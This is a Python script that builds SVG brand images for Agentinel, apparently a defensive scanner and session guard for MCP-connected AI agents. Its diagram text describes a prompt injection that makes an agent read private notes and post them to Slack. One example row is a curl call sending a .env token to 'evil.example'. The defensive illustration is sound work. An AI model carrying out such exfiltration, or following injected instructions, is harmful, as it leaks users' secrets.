# ruff: noqa: E501
"""Build the Agentinel brand images in docs/assets/.

Run from the repository root:

    uv run --with fonttools --with brotli python docs/brand/build.py

Writes logo.svg, mark.svg, hero.svg, trifecta.svg, guard.svg and guard-numbers.svg. Pass --png to also render social-preview.png (needs
Playwright; set CHROMIUM_PATH to use a specific Chromium).

Agentinel shares OpenFix's design system (Ink, Space Grotesk and JetBrains Mono, dark cards) with its own
signal colour, Sentinel Cyan. Every SVG embeds a font subset, so it renders the same everywhere, including
inside GitHub's <img> sandbox. The README is dark only: each image sits on its own dark card.
Brand rules live in docs/brand/README.md.
"""

from __future__ import annotations

import base64
import io
import math
import os
import sys
from pathlib import Path

from fontTools import subset
from fontTools.ttLib import TTFont

HERE = Path(__file__).resolve().parent
ASSETS = HERE.parent / "assets"

# --------------------------------------------------------------------------------------------
# Brand tokens
# --------------------------------------------------------------------------------------------

CYAN = "#22D3EE"  # Sentinel Cyan: Agentinel's signal colour. "Watching".
INK = "#0A0E16"  # Ink: the shared brand dark, same as OpenFix.

THEMES = {
    "dark": dict(
        name="dark",
        bg="#0A0E16",
        frame="#1C2433",
        dot="#182030",
        panel="#0F141F",
        raised="#141B28",
        line="#232D3F",
        text="#F2F5FA",
        muted="#A3ADBF",
        faint="#6C7689",
        glow=CYAN,
        glow_opacity=0.10,
        tile=CYAN,
        tile_ink=INK,
        accent=CYAN,
        accent_tint="#0B2A33",
        blue="#7DB2FF",
        blue_tint="#132541",
        violet="#BFA2FF",
        violet_tint="#241C40",
        amber="#FFBE5C",
        amber_tint="#33230B",
        red="#FF7B72",
        red_tint="#3A1A1C",
        neutral_tint="#1A2130",
    ),
}

FONTS = {
    ("sans", 400): "space-grotesk-latin-400-normal.woff2",
    ("sans", 500): "space-grotesk-latin-500-normal.woff2",
    ("sans", 700): "space-grotesk-latin-700-normal.woff2",
    ("mono", 500): "jetbrains-mono-latin-500-normal.woff2",
    ("mono", 700): "jetbrains-mono-latin-700-normal.woff2",
}
FAMILY = {
    "sans": "OFSans, 'Space Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif",
    "mono": "OFMono, 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace",
}
_ttf = {k: TTFont(HERE / "fonts" / v) for k, v in FONTS.items()}
_cmaps = {k: f.getBestCmap() for k, f in _ttf.items()}


def measure(s: str, size: float, font: str = "sans", weight: int = 500, ls: float = 0.0) -> float:
    f, cmap = _ttf[(font, weight)], _cmaps[(font, weight)]
    upm, hmtx = f["head"].unitsPerEm, f["hmtx"]
    w = sum(hmtx[cmap.get(ord(c), "space")][0] for c in s)
    return w * size / upm + ls * size * len(s)


def esc(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def f(n: float) -> str:
    return f"{n:.2f}".rstrip("0").rstrip(".")


# --------------------------------------------------------------------------------------------
# A tiny SVG canvas that remembers which glyphs it used, for font subsetting
# --------------------------------------------------------------------------------------------


class Canvas:
    def __init__(self, w: int, h: int, label: str):
        self.w, self.h, self.label = w, h, label
        self.defs: list[str] = []
        self.out: list[str] = []
        self.glyphs: dict[tuple[str, int], set[str]] = {}

    def add(self, s: str) -> None:
        self.out.append(s)

    def text(self, x, y, s, size, fill, font="sans", weight=500, anchor="start", ls=0.0, opacity=None):
        self.glyphs.setdefault((font, weight), set()).update(s)
        extra = f' letter-spacing="{f(ls * size)}"' if ls else ""
        extra += f' opacity="{opacity}"' if opacity is not None else ""
        self.add(
            f'<text x="{f(x)}" y="{f(y)}" font-family="{FAMILY[font]}" font-size="{f(size)}" font-weight="{weight}" fill="{fill}" text-anchor="{anchor}"{extra}>{esc(s)}</text>'
        )

    def spans(self, x, y, parts, size, font="sans", weight=500, anchor="start", ls=0.0):
        """parts: list of (text, fill) or (text, fill, weight). One <text> with coloured <tspan>s."""
        inner = []
        for p in parts:
            t, fill = p[0], p[1]
            w = p[2] if len(p) > 2 else weight
            self.glyphs.setdefault((font, w), set()).update(t)
            inner.append(f'<tspan fill="{fill}" font-weight="{w}">{esc(t)}</tspan>')
        extra = f' letter-spacing="{f(ls * size)}"' if ls else ""
        self.add(
            f'<text x="{f(x)}" y="{f(y)}" font-family="{FAMILY[font]}" font-size="{f(size)}" text-anchor="{anchor}"{extra}>{"".join(inner)}</text>'
        )

    def rect(self, x, y, w, h, rx=0, fill="none", stroke=None, sw=1, extra=""):
        s = f' stroke="{stroke}" stroke-width="{f(sw)}"' if stroke else ""
        self.add(f'<rect x="{f(x)}" y="{f(y)}" width="{f(w)}" height="{f(h)}" rx="{f(rx)}" fill="{fill}"{s}{extra}/>')

    def line(self, x1, y1, x2, y2, stroke, sw=1.5, extra=""):
        self.add(
            f'<line x1="{f(x1)}" y1="{f(y1)}" x2="{f(x2)}" y2="{f(y2)}" stroke="{stroke}" stroke-width="{f(sw)}"{extra}/>'
        )

    def path(self, d, fill="none", stroke=None, sw=1.5, extra=""):
        s = (
            f' stroke="{stroke}" stroke-width="{f(sw)}" stroke-linecap="round" stroke-linejoin="round"'
            if stroke
            else ""
        )
        self.add(f'<path d="{d}" fill="{fill}"{s}{extra}/>')

    def arrow(self, x1, y1, x2, y2, stroke, sw=1.75, head=6.0, dash=None):
        ang = math.atan2(y2 - y1, x2 - x1)
        d = f"M{f(x1)} {f(y1)} L{f(x2)} {f(y2)}"
        a1, a2 = ang + math.radians(150), ang - math.radians(150)
        hd = f"M{f(x2 + head * math.cos(a1))} {f(y2 + head * math.sin(a1))} L{f(x2)} {f(y2)} L{f(x2 + head * math.cos(a2))} {f(y2 + head * math.sin(a2))}"
        ex = f' stroke-dasharray="{dash}"' if dash else ""
        self.path(d, stroke=stroke, sw=sw, extra=ex)
        self.path(hd, stroke=stroke, sw=sw)

    def svg(self) -> str:
        style = font_css(self.glyphs)
        defs = f"<defs><style>{style}</style>{''.join(self.defs)}</defs>"
        return (
            f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 {self.w} {self.h}" width="{self.w}" height="{self.h}" role="img" aria-label="{esc(self.label)}">'
            f"{defs}{''.join(self.out)}</svg>\n"
        )


def font_css(glyphs: dict[tuple[str, int], set[str]]) -> str:
    rules = []
    for (font, weight), chars in sorted(glyphs.items()):
        opts = subset.Options()
        opts.flavor = "woff2"
        opts.layout_features = ["kern", "liga"]
        opts.name_IDs = []
        opts.notdef_outline = True
        tt = TTFont(HERE / "fonts" / FONTS[(font, weight)])
        sub = subset.Subsetter(opts)
        sub.populate(text="".join(sorted(chars)) + " ")
        sub.subset(tt)
        buf = io.BytesIO()
        tt.flavor = "woff2"
        tt.save(buf)
        b64 = base64.b64encode(buf.getvalue()).decode()
        fam = "OFSans" if font == "sans" else "OFMono"
        rules.append(
            f"@font-face{{font-family:{fam};font-weight:{weight};src:url(data:font/woff2;base64,{b64}) format('woff2')}}"
        )
    return "".join(rules)


# --------------------------------------------------------------------------------------------
# The mark: an open ring with a check that breaks out of it. "Open" + "verified fix".
# --------------------------------------------------------------------------------------------

# A shield with a watching eye, drawn on the 32-unit grid of the original logo.
SHIELD = "M16 2.5 L28 7 V15.5 C28 22.5 22.8 27.2 16 29.5 C9.2 27.2 4 22.5 4 15.5 V7 Z"
EYE = "M7.5 16 C11 11.5 21 11.5 24.5 16 C21 20.5 11 20.5 7.5 16 Z"


def mark(c: Canvas, x: float, y: float, size: float, tile: str, ink: str, rx_ratio: float = 0.27) -> None:
    s = size / 64
    c.add(
        f'<g transform="translate({f(x)} {f(y)}) scale({f(s)})">'
        f'<rect width="64" height="64" rx="{f(64 * rx_ratio)}" fill="{tile}"/>'
        '<g transform="translate(32 32.6) scale(1.36) translate(-16 -16)">'
        f'<path d="{SHIELD}" fill="none" stroke="{ink}" stroke-width="3.3" stroke-linejoin="round"/>'
        f'<path d="{EYE}" fill="none" stroke="{ink}" stroke-width="2.5" stroke-linejoin="round"/>'
        f'<circle cx="16" cy="16" r="2.9" fill="{ink}"/>'
        "</g></g>"
    )


def background(c: Canvas, T: dict, glow_at=(1.0, 0.0), card: bool = True) -> None:
    """The dot grid and glow. card=True draws a rounded, framed card; False fills edge to edge (social images,
    which GitHub and LinkedIn crop and round themselves)."""
    rx, inset = (20, 1) if card else (0, 0)
    c.defs.append(
        f'<pattern id="dots" width="22" height="22" patternUnits="userSpaceOnUse"><circle cx="1.5" cy="1.5" r="1.1" fill="{T["dot"]}"/></pattern>'
        f'<radialGradient id="glow" cx="{glow_at[0]}" cy="{glow_at[1]}" r="0.75"><stop offset="0" stop-color="{T["glow"]}" stop-opacity="{T["glow_opacity"]}"/><stop offset="1" stop-color="{T["glow"]}" stop-opacity="0"/></radialGradient>'
        f'<clipPath id="frame"><rect x="{inset}" y="{inset}" width="{c.w - 2 * inset}" height="{c.h - 2 * inset}" rx="{rx}"/></clipPath>'
    )
    c.rect(inset, inset, c.w - 2 * inset, c.h - 2 * inset, rx, T["bg"])
    c.add('<g clip-path="url(#frame)">')
    c.rect(0, 0, c.w, c.h, fill="url(#dots)")
    c.rect(0, 0, c.w, c.h, fill="url(#glow)")
    c.add("</g>")
    if card:
        c.rect(1, 1, c.w - 2, c.h - 2, 20, "none", T["frame"])


def headline(c: Canvas, T: dict, x, y, size, plain: str, hl: str = "", ls=-0.02, weight=700) -> None:
    """Plain text followed by the brand-highlighted part in the accent colour."""
    c.spans(x, y, [(plain, T["text"]), (hl, T["accent"])], size, weight=weight, ls=ls)


def header(c: Canvas, T: dict, eyebrow: str, title: tuple[str, str], chip_parts) -> None:
    mark(c, 32, 30, 46, T["tile"], T["tile_ink"])
    c.spans(94, 44, [("AGENTINEL", T["text"], 700), ("  /  " + eyebrow, T["faint"], 500)], 12, font="mono", ls=0.14)
    headline(c, T, 93, 75, 28, *title)
    # terminal-style chip on the right
    w = sum(measure(p[0], 15, "mono", 500) for p in chip_parts) + 36
    x = c.w - 32 - w
    c.rect(x, 36, w, 38, 10, T["panel"], T["line"])
    c.spans(x + 18, 60, chip_parts, 15, font="mono")


def pill(c, x, y, s, fg, bg, size=11.5, center=False, h=24, stroke=None):
    w = measure(s, size, "mono", 700, 0.12) + 22
    x0 = x - w / 2 if center else x
    c.rect(x0, y, w, h, h / 2, bg, stroke)
    c.text(
        x0 + w / 2 - 0.06 * size,
        y + h / 2 + size * 0.36,
        s,
        size,
        fg,
        font="mono",
        weight=700,
        anchor="middle",
        ls=0.12,
    )
    return w


def chip(c, x, y, w, s, T, fg=None, bg=None, stroke=None, font="sans", weight=500, size=14, h=30):
    c.rect(x, y, w, h, 8, bg or T["raised"], stroke if stroke is not None else T["line"])
    c.text(x + w / 2, y + h / 2 + size * 0.35, s, size, fg or T["text"], font=font, weight=weight, anchor="middle")


def small_arrow(c, x, y, color, length=12):
    c.arrow(x, y, x + length, y, color, sw=1.5, head=4.5)


def check(c, cx, cy, r, T):
    c.add(
        f'<circle cx="{f(cx)}" cy="{f(cy)}" r="{f(r)}" fill="{T["accent_tint"]}" stroke="{T["accent"]}" stroke-width="1.25"/>'
    )
    c.path(
        f"M{f(cx - r * 0.42)} {f(cy + r * 0.02)} L{f(cx - r * 0.1)} {f(cy + r * 0.36)} L{f(cx + r * 0.45)} {f(cy - r * 0.34)}",
        stroke=T["accent"],
        sw=1.9,
    )


def panel(c, T, x, y, w, h, label, acc, note=None):
    c.rect(x, y, w, h, 16, T["panel"], T["line"])
    c.path(f"M{x + 18} {y + 0.75} h{w - 36}", stroke=T[acc], sw=3)
    fg = T["accent"] if acc == "accent" else T[acc]
    pill(c, x + 18, y + 20, label, fg, T[acc + "_tint"])
    if note:
        c.text(x + w - 20, y + 37, note, 12.5, T["faint"], font="mono", weight=500, anchor="end")


def tag(c, T, x, y, s, fg, bg, size=12.5, font="mono", weight=500):
    w = measure(s, size, font, weight) + 20
    c.rect(x, y, w, 24, 6, bg)
    c.text(x + w / 2, y + 16.5, s, size, fg, font=font, weight=weight, anchor="middle")
    return w


def cross(c, cx, cy, r, T):
    c.add(
        f'<circle cx="{f(cx)}" cy="{f(cy)}" r="{f(r)}" fill="{T["red_tint"]}" stroke="{T["red"]}" stroke-width="1.25"/>'
    )
    d = r * 0.36
    c.path(
        f"M{f(cx - d)} {f(cy - d)} L{f(cx + d)} {f(cy + d)} M{f(cx + d)} {f(cy - d)} L{f(cx - d)} {f(cy + d)}",
        stroke=T["red"],
        sw=1.9,
    )


def dot(c, cx, cy, r, T, tone="faint"):
    c.add(
        f'<circle cx="{f(cx)}" cy="{f(cy)}" r="{f(r)}" fill="{T["neutral_tint"]}" stroke="{T[tone]}" stroke-width="1.25"/>'
    )
    c.add(f'<circle cx="{f(cx)}" cy="{f(cy)}" r="{f(r * 0.28)}" fill="{T[tone]}"/>')


def footer_note(c, T, y, parts):
    """A full-width rounded strip at the bottom of a diagram."""
    c.rect(32, y, c.w - 64, 48, 24, T["panel"], T["line"])
    c.add(f'<circle cx="58" cy="{f(y + 24)}" r="4.5" fill="{T["accent"]}"/>')
    c.spans(74, y + 29.5, parts, 15)


def render_png(svg: str, dest: Path, w: int, h: int) -> None:
    from playwright.sync_api import sync_playwright

    with sync_playwright() as p:
        b = p.chromium.launch(executable_path=os.environ.get("CHROMIUM_PATH") or None)
        page = b.new_page(viewport={"width": w, "height": h}, device_scale_factor=1)
        page.set_content(f"<html><body style='margin:0;background:{INK}'>{svg}</body></html>")
        page.wait_for_timeout(300)
        page.screenshot(path=str(dest), clip={"x": 0, "y": 0, "width": w, "height": h})
        b.close()


# --------------------------------------------------------------------------------------------
# Logo lockup and mark
# --------------------------------------------------------------------------------------------


def logo(T: dict) -> str:
    # A solid card, like the diagrams, so the logo reads on light and dark GitHub pages alike.
    c = Canvas(660, 180, "Agentinel")
    background(c, T)
    mark(c, 36, 38, 104, T["tile"], T["tile_ink"])
    c.text(164, 106, "Agentinel", 68, T["text"], weight=700, ls=-0.035)
    c.text(167, 140, "a sentinel for your AI agents", 17, T["muted"], font="mono", weight=500, ls=-0.01)
    return c.svg()


def mark_svg() -> str:
    c = Canvas(64, 64, "Agentinel")
    mark(c, 0, 0, 64, CYAN, INK)
    return c.svg()


# --------------------------------------------------------------------------------------------
# Shared: the three trifecta axes
# --------------------------------------------------------------------------------------------

AXES = [("A", "untrusted input", "blue"), ("B", "sensitive data", "amber"), ("C", "external action", "red")]


def axis_dot(c, cx, cy, T, acc, on):
    if on:
        c.add(
            f'<circle cx="{f(cx)}" cy="{f(cy)}" r="8" fill="{T[acc + "_tint"]}" stroke="{T[acc]}" stroke-width="1.25"/>'
        )
        c.add(f'<circle cx="{f(cx)}" cy="{f(cy)}" r="4" fill="{T[acc]}"/>')
    else:
        c.add(f'<circle cx="{f(cx)}" cy="{f(cy)}" r="3" fill="{T["line"]}"/>')


def axis_chip(c, x, y, T, letter, label, acc):
    """A lit axis: the letter in a tinted square, then its meaning."""
    c.rect(x, y, 26, 26, 7, T[acc + "_tint"])
    c.text(x + 13, y + 18, letter, 14, T[acc], font="mono", weight=700, anchor="middle")
    c.text(x + 36, y + 18, label, 14, T["text"])
    return 36 + measure(label, 14) + 22


def severity(c, x, y, T, label="HIGH"):
    return pill(c, x, y, label, T["red"], T["red_tint"], size=12, h=26)


# --------------------------------------------------------------------------------------------
# Hero: a real scan of GitHub's MCP server
# --------------------------------------------------------------------------------------------


def hero(T: dict) -> str:
    c = Canvas(
        1280,
        664,
        "Agentinel scans GitHub's MCP server and flags a high-severity lethal trifecta: it reads untrusted issues and PRs, reads sensitive repo data, and can push and merge.",
    )
    background(c, T)
    header(
        c,
        T,
        "MCP SECURITY SCANNER",
        ("A sentinel for ", "your AI agents."),
        [("$ ", T["accent"], 700), ("agentinel scan ", T["text"]), ("--config mcp.json", T["muted"])],
    )
    X, Y, W, H = 32, 116, 1216, 344
    panel(c, T, X, Y, W, H, "SCAN", "accent", "github MCP server · 5 of its tools")
    cols = [780, 920, 1060]
    for (letter, label, acc), cx in zip(AXES, cols, strict=True):
        c.text(cx, Y + 80, letter, 15, T[acc], font="mono", weight=700, anchor="middle")
        c.text(cx, Y + 100, label, 12, T["faint"], font="mono", anchor="middle")
    rows = [
        ("list_issues", (1, 0, 0)),
        ("get_file_contents", (0, 1, 0)),
        ("get_secret_scanning_alert", (0, 1, 0)),
        ("push_files", (0, 1, 1)),
        ("create_pull_request", (1, 0, 1)),
    ]
    for k, (tool, on) in enumerate(rows):
        y = Y + 136 + k * 42
        if k:
            c.line(X + 24, y - 21, X + W - 24, y - 21, T["line"], 1)
        c.spans(
            X + 26,
            y + 6,
            [("github", T["violet"], 700), (" / ", T["faint"]), (tool, T["text"])],
            17,
            font="mono",
            weight=500,
        )
        for (_, _, acc), cx, v in zip(AXES, cols, on, strict=True):
            axis_dot(c, cx, y, T, acc, v)

    # the finding
    FY = Y + H + 20
    c.rect(X, FY, W, 92, 14, T["raised"], T["red"], 1.25)
    c.rect(X, FY + 14, 4, 64, 2, T["red"])
    severity(c, X + 26, FY + 22, T)
    c.text(
        X + 104,
        FY + 41,
        "Lethal trifecta: reads untrusted issues and PRs, reads private repo data, and can push and merge",
        18,
        T["text"],
        weight=700,
    )
    c.spans(
        X + 104,
        FY + 68,
        [
            ("ASI02 · Tool Misuse", T["red"], 700),
            ("  ·  the same exploit class disclosed in the real GitHub MCP attack", T["muted"]),
        ],
        14,
    )
    for i, (letter, _, acc) in enumerate(AXES):
        tag(c, T, X + W - 128 + i * 34, FY + 34, letter, T[acc], T[acc + "_tint"], size=13, weight=700)

    footer_note(
        c,
        T,
        FY + 112,
        [
            ("Static and read-only. ", T["text"], 700),
            ("Never calls a tool. Findings to the terminal, JSON, SARIF and an HTML dashboard.", T["muted"]),
        ],
    )
    return c.svg()


# --------------------------------------------------------------------------------------------
# The cross-server lethal trifecta: three safe servers, one dangerous agent
# --------------------------------------------------------------------------------------------


def trifecta(T: dict) -> str:
    c = Canvas(
        1280,
        618,
        "The cross-server lethal trifecta: web-fetcher reads untrusted pages, notes-reader reads private notes, and slack-notifier posts outside. None is a trifecta alone, but one agent connected to all three can be injected and made to exfiltrate.",
    )
    background(c, T, glow_at=(0.5, 1.0))
    header(
        c,
        T,
        "LETHAL TRIFECTA",
        ("Safe alone. ", "Dangerous together."),
        [("cross-server", T["text"]), (" · ASI02", T["muted"])],
    )
    servers = [
        ("web-fetcher", "fetch_doc", "web pages", AXES[0]),
        ("notes-reader", "read_file · list_files", "your notes", AXES[1]),
        ("slack-notifier", "send_message", "posts to Slack", AXES[2]),
    ]
    CW, CH, GAP, CY = 384, 170, 32, 116
    for i, (name, tools, what, (letter, label, acc)) in enumerate(servers):
        x = 32 + i * (CW + GAP)
        c.rect(x, CY, CW, CH, 14, T["panel"], T["line"])
        c.path(f"M{x + 18} {CY + 0.75} h{CW - 36}", stroke=T[acc], sw=3)
        c.text(x + 22, CY + 42, name, 19, T["text"], font="mono", weight=700)
        c.text(x + 22, CY + 68, tools, 13.5, T["faint"], font="mono")
        axis_chip(c, x + 22, CY + 88, T, letter, label, acc)
        c.text(x + 22 + 36 + measure(label, 14) + 12, CY + 106, f"· {what}", 14, T["muted"])
        c.line(x + 22, CY + 128, x + CW - 22, CY + 128, T["line"], 1)
        check(c, x + 32, CY + 148, 8, T)
        c.text(x + 48, CY + 153, "alone: no trifecta", 14, T["muted"])
        # converge on the agent
        sx, sy = x + CW / 2, CY + CH + 2
        tx, ty = 640 + (i - 1) * 150, 356
        c.path(
            f"M{f(sx)} {f(sy)} C{f(sx)} {f(sy + 40)} {f(tx)} {f(ty - 40)} {f(tx)} {f(ty - 6)}",
            stroke=T[acc],
            sw=1.75,
            extra=' opacity="0.8"',
        )
        c.path(f"M{f(tx - 5)} {f(ty - 12)} L{f(tx)} {f(ty - 6)} L{f(tx + 5)} {f(ty - 12)}", stroke=T[acc], sw=1.75)

    # the agent that holds all three
    AX, AY, AW, AH = 200, 356, 880, 168
    c.defs.append(
        '<filter id="halo" x="-30%" y="-30%" width="160%" height="160%"><feGaussianBlur stdDeviation="16"/></filter>'
    )
    c.rect(AX + 10, AY + 12, AW - 20, AH - 12, 16, T["red"], extra=' opacity="0.14" filter="url(#halo)"')
    c.rect(AX, AY, AW, AH, 16, T["raised"], T["red"], 1.5)
    c.text(AX + 28, AY + 42, "One agent connected to all three", 20, T["text"], weight=700)
    x = AX + 28
    for letter, label, acc in AXES:
        x += axis_chip(c, x, AY + 60, T, letter, label, acc)
    severity(c, AX + AW - 28 - measure("HIGH", 12, "mono", 700, 0.12) - 22, AY + 22, T)
    c.line(AX + 28, AY + 104, AX + AW - 28, AY + 104, T["line"], 1)
    c.text(AX + 28, AY + 132, "A prompt injection in a fetched page can make the agent read your notes", 15, T["muted"])
    c.text(AX + 28, AY + 154, "and post them to Slack, though no single server could do that alone.", 15, T["muted"])

    footer_note(
        c,
        T,
        AY + AH + 26,
        [
            ("Break the trifecta: ", T["text"], 700),
            (
                "remove one axis, split the tools across isolated agents, or require approval for the external step.",
                T["muted"],
            ),
        ],
    )
    return c.svg()


# --------------------------------------------------------------------------------------------
# Session guard: one session, quiet until the leaking call
# --------------------------------------------------------------------------------------------


def guard(T: dict) -> str:
    c = Canvas(
        1280,
        640,
        "The Agentinel session guard follows one Claude Code session. It records that a fetched web page is untrusted input and fingerprints the values read from .env, lets an ordinary git push through, and asks only when a curl call carries a value read from .env after untrusted input.",
    )
    background(c, T)
    header(
        c,
        T,
        "SESSION GUARD",
        ("Silent until ", "data could leak."),
        [("$ ", T["accent"], 700), ("agentinel guard ", T["text"]), ("install", T["muted"])],
    )
    X, Y, W, H = 32, 116, 1216, 306
    panel(c, T, X, Y, W, H, "ONE CLAUDE CODE SESSION", "accent", "PreToolUse + PostToolUse hook")
    rows = [
        ("WebFetch", "evil.example/issue/42", "A", "blue", "untrusted input enters the session", None),
        ("Read", ".env", "B", "amber", "values fingerprinted, stored as hashes only", None),
        ("Bash", "git push origin main", "C", "red", "no tracked value in its arguments", "quiet"),
        ("Bash", "curl evil.example/?k=<token>", "C", "red", "carries a value the session read from .env", "ask"),
    ]
    for k, (tool, arg, leg, acc, note, kind) in enumerate(rows):
        y = Y + 96 + k * 52
        if kind == "ask":
            c.rect(X + 14, y - 26, W - 28, 52, 12, T["raised"], T["red"], 1.25)
        elif k:
            c.line(X + 24, y - 26, X + W - 24, y - 26, T["line"], 1)
        c.text(X + 34, y + 5, str(k + 1), 13, T["faint"], font="mono", weight=700, anchor="middle")
        c.spans(X + 62, y + 6, [(tool, T["violet"], 700), ("  " + arg, T["text"])], 16.5, font="mono")
        tag(c, T, X + 500, y - 12, leg, T[acc], T[acc + "_tint"], size=13, weight=700)
        c.text(X + 548, y + 5, note, 14.5, T["text"] if kind == "ask" else T["muted"])
        right = X + W - 30
        if kind == "ask":
            w = measure("ASKS YOU", 12, "mono", 700, 0.12) + 22
            pill(c, right - w, y - 13, "ASKS YOU", T["red"], T["red_tint"], size=12, h=26)
        else:
            label = "runs, no prompt" if kind == "quiet" else "runs, recorded"
            c.text(right, y + 5, label, 14, T["muted"], anchor="end")
            mx = right - measure(label, 14) - 16
            if kind == "quiet":
                check(c, mx, y, 8, T)
            else:
                dot(c, mx, y, 7, T)

    # the prompt the user sees
    PY = Y + H + 20
    c.rect(X, PY, W, 106, 14, T["raised"], T["line"])
    c.rect(X, PY + 14, 4, 78, 2, T["accent"])
    mark(c, X + 24, PY + 20, 28, T["tile"], T["tile_ink"])
    c.text(X + 64, PY + 39, "Agentinel guard", 15, T["text"], weight=700)
    c.text(X + 200, PY + 39, "the reason shown in Claude Code's own approval prompt", 13, T["faint"], font="mono")
    c.spans(
        X + 64,
        PY + 66,
        [
            ("This session has read untrusted input ", T["muted"]),
            ("(WebFetch evil.example)", T["blue"]),
            (" and this call to Bash curl carries data", T["muted"]),
        ],
        15.5,
    )
    c.spans(
        X + 64,
        PY + 89,
        [
            ("the session read from ", T["muted"]),
            ("Read .env", T["amber"]),
            (", so a prompt injection could be leaking it. ", T["muted"]),
            ("Approve only if you expected this.", T["text"], 700),
        ],
        15.5,
    )
    footer_note(
        c,
        T,
        PY + 126,
        [
            ("Never grants a permission. ", T["text"], 700),
            ("It can only add a prompt, and it fails open, so your own permission rules still apply.", T["muted"]),
        ],
    )
    return c.svg()


def guard_numbers(T: dict) -> str:
    c = Canvas(
        1280,
        640,
        "Replaying six recorded Claude Code sessions, about 1,000 tool calls: asking before every external action means 88 prompts; the guard with session-wide tracking 83; the guard with value-level flow tracking 2.",
    )
    background(c, T, glow_at=(0.15, 1.0))
    header(
        c,
        T,
        "SESSION GUARD  /  MEASURED",
        ("88 approval prompts, ", "down to 2."),
        [("6 sessions", T["text"]), (" · ~1,000 tool calls", T["muted"])],
    )
    X, Y, W, H = 32, 116, 1216, 290
    panel(c, T, X, Y, W, H, "REPLAY", "accent", "agentinel guard replay · real recorded sessions")
    rows = [
        ("Ask before every external action", "the usual baseline", 88, "faint", "100%"),
        ("Guard, session-wide tracking", "asks once a session touched any secret", 83, "amber", "94%"),
        ("Guard, value-level flow tracking", "asks only if the secret is in the call", 2, "accent", "2%"),
    ]
    BX, BW = X + 430, 600
    c.defs.append(
        '<filter id="barglow" x="-100%" y="-200%" width="300%" height="500%"><feGaussianBlur stdDeviation="8"/></filter>'
    )
    for k, (label, sub, n, acc, pct) in enumerate(rows):
        y = Y + 100 + k * 66
        if k:
            c.line(X + 24, y - 36, X + W - 24, y - 36, T["line"], 1)
        hl = acc == "accent"
        c.text(X + 26, y - 2, label, 17, T["text"], weight=700)
        c.text(X + 26, y + 20, sub, 12.5, T["faint"], font="mono")
        c.rect(BX, y - 9, BW, 18, 9, T["neutral_tint"])
        bw = max(BW * n / 88, 18)
        if hl:
            c.rect(BX, y - 9, bw, 18, 9, T["accent"], extra=' opacity="0.6" filter="url(#barglow)"')
        c.rect(BX, y - 9, bw, 18, 9, T[acc])
        c.text(X + W - 96, y + 10, str(n), 30, T["accent"] if hl else T["text"], font="mono", weight=700, anchor="end")
        c.text(X + W - 28, y + 8, pct, 14, T["accent"] if hl else T["muted"], font="mono", weight=700, anchor="end")

    # two findings
    CY, CW, CH = Y + H + 20, 592, 110
    cards = [
        (
            "amber",
            "Tracking the session is too coarse",
            ["Once a long coding session touches any secret,", "every later git push asks. It saved only 6%."],
        ),
        (
            "accent",
            "Tracking the value works",
            ["Both prompts left were one shell command that read", "a credential and called out in the same step."],
        ),
    ]
    for i, (acc, title, lines) in enumerate(cards):
        x = X + i * (CW + 32)
        c.rect(x, CY, CW, CH, 14, T["panel"], T["line"])
        c.path(f"M{x + 18} {CY + 0.75} h{CW - 36}", stroke=T[acc], sw=3)
        c.text(x + 24, CY + 38, title, 17, T["text"], weight=700)
        for j, ln in enumerate(lines):
            c.text(x + 24, CY + 66 + j * 22, ln, 15, T["muted"])
    footer_note(
        c,
        T,
        CY + CH + 20,
        [
            ("Research prototype. ", T["text"], 700),
            ("A small, one-person sample. Replay runs locally and reports counts only.", T["muted"]),
        ],
    )
    return c.svg()


# --------------------------------------------------------------------------------------------
# Social preview (GitHub and LinkedIn link cards)
# --------------------------------------------------------------------------------------------


def social(T: dict) -> str:
    c = Canvas(1280, 640, "Agentinel")
    background(c, T, glow_at=(0.95, 0.05), card=False)
    mark(c, 96, 150, 132, T["tile"], T["tile_ink"])
    c.text(262, 248, "Agentinel", 104, T["text"], weight=700, ls=-0.035)
    headline(c, T, 100, 380, 50, "A sentinel for ", "your AI agents.", ls=-0.025)
    c.text(102, 440, "Audit MCP servers and agent fleets for the lethal", 25, T["muted"])
    c.text(102, 475, "trifecta, tool poisoning and leaked secrets.", 25, T["muted"])
    # a scan result card on the right
    x, y, w, h = 906, 150, 282, 340
    c.defs.append(
        '<filter id="soft" x="-30%" y="-30%" width="160%" height="160%"><feGaussianBlur stdDeviation="22"/></filter>'
    )
    c.rect(x + 20, y + 30, w - 40, h - 30, 18, T["accent"], extra=' opacity="0.16" filter="url(#soft)"')
    c.rect(x, y, w, h, 18, T["raised"], T["line"])
    c.path(f"M{x + 20} {y + 0.75} h{w - 40}", stroke=T["accent"], sw=3)
    c.text(x + 24, y + 42, "SCAN", 11, T["faint"], font="mono", weight=700, ls=0.14)
    c.text(x + 24, y + 68, "github MCP server", 19, T["text"], weight=700)
    c.text(x + 24, y + 90, "from the real-world catalog", 13, T["muted"], font="mono", weight=500)
    c.line(x + 24, y + 110, x + w - 24, y + 110, T["line"])
    for k, (letter, label, acc) in enumerate(AXES):
        cy = y + 142 + k * 36
        c.rect(x + 24, cy - 17, 24, 24, 6, T[acc + "_tint"])
        c.text(x + 36, cy, letter, 13, T[acc], font="mono", weight=700, anchor="middle")
        c.text(x + 58, cy, label, 15, T["text"], weight=700)
        axis_dot(c, x + w - 36, cy - 5, T, acc, True)
    c.line(x + 24, y + 260, x + w - 24, y + 260, T["line"])
    severity(c, x + 24, y + 280, T)
    c.text(x + 104, y + 298, "lethal trifecta", 15, T["text"], weight=700)
    c.text(x + 24, y + 324, "ASI02 · OWASP Agentic Top 10", 12, T["muted"], font="mono")
    c.spans(
        102,
        560,
        [
            ("$ ", T["accent"], 700),
            ("agentinel scan ", T["text"]),
            ("--config mcp.json", T["muted"]),
            ("   ·   github.com/markusweldon/agentinel", T["faint"]),
        ],
        20,
        font="mono",
    )
    return c.svg()


def main() -> None:
    ASSETS.mkdir(parents=True, exist_ok=True)
    T = THEMES["dark"]
    out = {
        "mark.svg": mark_svg(),
        "logo.svg": logo(T),
        "hero.svg": hero(T),
        "trifecta.svg": trifecta(T),
        "guard.svg": guard(T),
        "guard-numbers.svg": guard_numbers(T),
    }
    for fn, svg in out.items():
        (ASSETS / fn).write_text(svg)
        print(f"wrote docs/assets/{fn} ({len(svg) / 1024:.0f} KB)")
